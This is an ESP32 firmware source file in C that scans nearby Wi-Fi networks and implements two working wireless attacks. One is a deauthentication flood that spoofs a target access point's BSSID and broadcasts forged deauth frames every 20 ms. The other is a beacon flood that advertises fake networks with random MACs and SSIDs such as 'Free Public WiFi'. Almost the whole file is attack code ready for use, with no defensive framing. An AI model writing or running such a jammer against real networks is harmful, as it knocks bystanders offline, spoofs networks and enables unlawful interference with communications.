#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include "wifi_ops.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_random.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "wifi_ops";

#define DEAUTH_INTERVAL_MS  20
#define BEACON_INTERVAL_MS  100

static volatile bool s_running      = false;
static uint32_t      s_packets_sent = 0;
static uint32_t      s_elapsed_sec  = 0;
static TaskHandle_t  s_task         = NULL;

/* ---- Frame templates (same as S3 side) ------------------------------ */
#pragma pack(push, 1)
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} deauth_frame_t;

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
    uint64_t timestamp;
    uint16_t beacon_interval;
    uint16_t capability_info;
} beacon_hdr_t;
#pragma pack(pop)

static void build_deauth(deauth_frame_t *f, const uint8_t bssid[6],
                          const uint8_t dest[6])
{
    f->frame_control = 0x00C0;
    f->duration      = 0x0000;
    memcpy(f->addr1, dest,  6);
    memcpy(f->addr2, bssid, 6);
    memcpy(f->addr3, bssid, 6);
    f->seq_ctrl      = 0x0000;
    f->reason_code   = 0x0007;
}

static void random_ssid(char *out, size_t len)
{
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int n = 6 + (esp_random() % 10);
    if ((size_t)n >= len) n = len - 1;
    for (int i = 0; i < n; i++) {
        out[i] = charset[esp_random() % (sizeof(charset) - 1)];
    }
    out[n] = '\0';
}

static void build_beacon(uint8_t *buf, size_t *out_len,
                          const char *ssid, const uint8_t mac[6])
{
    beacon_hdr_t *hdr = (beacon_hdr_t *)buf;
    memset(hdr, 0, sizeof(*hdr));
    hdr->frame_control   = 0x0080;
    memset(hdr->addr1, 0xFF, 6);
    memcpy(hdr->addr2, mac, 6);
    memcpy(hdr->addr3, mac, 6);
    hdr->beacon_interval = 0x0064;
    hdr->capability_info = 0x0401;

    uint8_t *p   = buf + sizeof(beacon_hdr_t);
    size_t ssid_len = strlen(ssid);
    *p++ = 0x00; *p++ = (uint8_t)ssid_len;
    memcpy(p, ssid, ssid_len); p += ssid_len;
    *p++ = 0x01; *p++ = 4;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = 0x03; *p++ = 1; *p++ = 0x01;
    *out_len = p - buf;
}

/* ---- Promiscuous callback (empty -- inject only) -------------------- */
static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    (void)buf; (void)type;
}

/* ---- Deauth task ---------------------------------------------------- */
typedef struct { uint8_t bssid[6]; uint8_t channel; } deauth_args_t;

static void deauth_task(void *pv)
{
    deauth_args_t args = *(deauth_args_t *)pv;
    free(pv);

    esp_wifi_set_mode(WIFI_MODE_STA);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_promiscuous(true);

    bool promisc = false;
    for (int i = 0; i < 20 && !promisc; i++) {
        esp_wifi_get_promiscuous(&promisc);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    esp_wifi_set_channel(args.channel, WIFI_SECOND_CHAN_NONE);

    const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    deauth_frame_t frame;
    build_deauth(&frame, args.bssid, bc);

    uint32_t ticks = 0;
    const uint32_t tps = 1000 / DEAUTH_INTERVAL_MS;

    while (s_running) {
        esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
        s_packets_sent++;
        if (++ticks % tps == 0) s_elapsed_sec++;
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_INTERVAL_MS));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_STA);
    s_task = NULL;
    vTaskDelete(NULL);
}

/* ---- Beacon task ---------------------------------------------------- */
static void beacon_task(void *pv)
{
    bool random_mode = (bool)(intptr_t)pv;

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    vTaskDelay(pdMS_TO_TICKS(150));

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_promiscuous(true);

    bool promisc = false;
    for (int i = 0; i < 20 && !promisc; i++) {
        esp_wifi_get_promiscuous(&promisc);
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    static const char *custom_ssids[] = {
        "Network Unavailable",
        "Free Public WiFi",
        "Test SSID 01",
        "Test SSID 02",
    };
    const uint8_t custom_count = 4;
    uint8_t list_idx = 0;

    uint8_t frame_buf[128];
    uint8_t mac[6];
    char    ssid_buf[WROOM_MAX_SSID_LEN];
    uint32_t ticks = 0;
    const uint32_t tps = 1000 / BEACON_INTERVAL_MS;

    while (s_running) {
        esp_fill_random(mac, 6);
        mac[0] &= 0xFE;
        mac[0] |= 0x02;

        if (random_mode) {
            random_ssid(ssid_buf, sizeof(ssid_buf));
        } else {
            strncpy(ssid_buf, custom_ssids[list_idx], sizeof(ssid_buf) - 1);
            list_idx = (list_idx + 1) % custom_count;
        }

        size_t len = 0;
        build_beacon(frame_buf, &len, ssid_buf, mac);
        esp_wifi_80211_tx(WIFI_IF_AP, frame_buf, len, false);
        s_packets_sent++;
        if (++ticks % tps == 0) s_elapsed_sec++;
        vTaskDelay(pdMS_TO_TICKS(BEACON_INTERVAL_MS));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_STA);
    s_task = NULL;
    vTaskDelete(NULL);
}

/* ---- Public API ----------------------------------------------------- */

esp_err_t wifi_ops_init(void)
{
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES ||
        err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(err);
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "WiFi ops ready");
    return ESP_OK;
}

esp_err_t wifi_ops_scan(wroom_scan_result_t *out)
{
    wifi_scan_config_t scan_cfg = {
        .ssid        = NULL,
        .bssid       = NULL,
        .channel     = 0,
        .show_hidden = true,
        .scan_type   = WIFI_SCAN_TYPE_ACTIVE,
    };
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_cfg, true));

    uint16_t count = WROOM_SCAN_MAX_APS;
    wifi_ap_record_t records[WROOM_SCAN_MAX_APS];
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&count, records));

    out->count = (count > WROOM_SCAN_MAX_APS) ? WROOM_SCAN_MAX_APS : count;
    for (int i = 0; i < out->count; i++) {
        strncpy(out->aps[i].ssid, (char *)records[i].ssid, WROOM_MAX_SSID_LEN - 1);
        memcpy(out->aps[i].bssid, records[i].bssid, 6);
        out->aps[i].channel = records[i].primary;
        out->aps[i].rssi    = records[i].rssi;
    }
    return ESP_OK;
}

esp_err_t wifi_ops_start_deauth(const uint8_t bssid[6], uint8_t channel)
{
    if (s_running) return ESP_ERR_INVALID_STATE;
    deauth_args_t *args = calloc(1, sizeof(deauth_args_t));
    if (!args) return ESP_ERR_NO_MEM;
    memcpy(args->bssid, bssid, 6);
    args->channel    = channel;
    s_packets_sent   = 0;
    s_elapsed_sec    = 0;
    s_running        = true;
    xTaskCreatePinnedToCore(deauth_task, "deauth", 6144, args, 5, &s_task, 1);
    return ESP_OK;
}

esp_err_t wifi_ops_start_beacon_flood(bool random_mode)
{
    if (s_running) return ESP_ERR_INVALID_STATE;
    s_packets_sent = 0;
    s_elapsed_sec  = 0;
    s_running      = true;
    xTaskCreatePinnedToCore(beacon_task, "beacon", 6144,
                             (void *)(intptr_t)random_mode, 5, &s_task, 1);
    return ESP_OK;
}

esp_err_t wifi_ops_stop(void)
{
    s_running = false;
    vTaskDelay(pdMS_TO_TICKS(50));
    esp_wifi_set_mode(WIFI_MODE_STA);
    return ESP_OK;
}

uint32_t wifi_ops_get_packets_sent(void) { return s_packets_sent; }
uint32_t wifi_ops_get_elapsed_sec(void)  { return s_elapsed_sec;  }
